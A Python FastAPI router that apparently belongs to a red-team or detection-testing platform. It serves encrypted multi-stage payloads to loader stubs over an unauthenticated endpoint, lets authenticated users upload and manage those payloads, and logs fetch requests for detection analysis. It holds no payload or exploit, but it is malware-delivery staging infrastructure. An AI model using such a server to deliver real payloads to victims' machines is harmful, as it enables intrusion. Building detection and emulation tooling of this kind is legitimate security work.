"""Staging router for loader chain payloads."""

import hashlib
import uuid
from typing import Optional

from fastapi import APIRouter, File, Form, HTTPException, Request, UploadFile, status
from fastapi.responses import Response

from ...storage import (
    deactivate_staging_payload,
    get_active_staging_payload,
    get_staging_payload,
    list_staging_payloads,
    list_staging_requests,
    log_staging_request,
    save_staging_payload,
)
from ..deps import CurrentUser
from ..schemas import (
    StagingListResponse,
    StagingPayload,
    StagingRequest,
    StagingRequestListResponse,
    StagingUploadResponse,
)

router = APIRouter(prefix="/api/staging", tags=["staging"])


@router.get("/{stage_id}", response_class=Response)
async def fetch_stage(
    stage_id: str,
    request: Request,
):
    """
    Fetch encrypted stage payload - UNAUTHENTICATED.

    This endpoint is called by loader stubs to fetch the next stage.
    Logs all requests for detection artifact generation.

    stage_id can be:
    - A stage number (1, 2, 3) to get the active payload for that stage
    - A specific payload ID (UUID) to get that exact payload
    """
    client_ip = request.client.host if request.client else None
    user_agent = request.headers.get("user-agent")

    # Try to parse as stage number first
    payload = None
    try:
        stage_num = int(stage_id)
        if 1 <= stage_num <= 3:
            payload = await get_active_staging_payload(stage_num)
    except ValueError:
        # Not a number, try as UUID
        payload = await get_staging_payload(stage_id)

    if not payload:
        # Log failed request for detection
        await log_staging_request(
            request_id=str(uuid.uuid4()),
            payload_id=stage_id,
            client_ip=client_ip,
            user_agent=user_agent,
            served=False,
        )
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Stage not found",
        )

    # Log successful request
    await log_staging_request(
        request_id=str(uuid.uuid4()),
        payload_id=payload["id"],
        client_ip=client_ip,
        user_agent=user_agent,
        served=True,
    )

    # Return raw encrypted blob
    return Response(
        content=payload["encrypted_blob"],
        media_type="application/octet-stream",
        headers={
            "Content-Length": str(payload["size"]),
            "X-Stage-SHA256": payload["sha256"],
        },
    )


@router.post("/upload", response_model=StagingUploadResponse)
async def upload_stage(
    current_user: CurrentUser,
    stage_number: Optional[int] = Form(None),
    name: str = Form(...),
    description: str = Form(None),
    encryption_key_hint: str = Form(None),
    file: UploadFile = File(...),
):
    """
    Upload a new staging payload.

    The file should already be encrypted by the builder tool.
    """
    content = await file.read()
    if len(content) == 0:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Empty file",
        )

    # Compute SHA256
    sha256 = hashlib.sha256(content).hexdigest()

    payload_id = str(uuid.uuid4())
    await save_staging_payload(
        payload_id=payload_id,
        stage_number=stage_number,
        name=name,
        encrypted_blob=content,
        size=len(content),
        sha256=sha256,
        description=description,
        encryption_key_hint=encryption_key_hint,
        created_by=current_user["id"],
    )

    return StagingUploadResponse(
        id=payload_id,
        stage_number=stage_number,
        name=name,
        size=len(content),
        sha256=sha256,
    )


@router.get("", response_model=StagingListResponse)
async def list_stages(
    current_user: CurrentUser,
    stage_number: int = None,
):
    """List staging payloads, optionally filtered by stage number."""
    payloads = await list_staging_payloads(stage_number=stage_number)
    return StagingListResponse(
        payloads=[StagingPayload(**p) for p in payloads],
        total=len(payloads),
    )


@router.delete("/{payload_id}")
async def deactivate_stage(
    payload_id: str,
    current_user: CurrentUser,
):
    """Deactivate a staging payload (soft delete)."""
    payload = await get_staging_payload(payload_id)
    if not payload:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Payload not found",
        )

    await deactivate_staging_payload(payload_id)
    return {"status": "deactivated", "id": payload_id}


@router.get("/requests/log", response_model=StagingRequestListResponse)
async def list_stage_requests(
    current_user: CurrentUser,
    payload_id: str = None,
    limit: int = 100,
):
    """List staging fetch requests for detection analysis."""
    requests = await list_staging_requests(payload_id=payload_id, limit=limit)
    return StagingRequestListResponse(
        requests=[StagingRequest(**r) for r in requests],
        total=len(requests),
    )
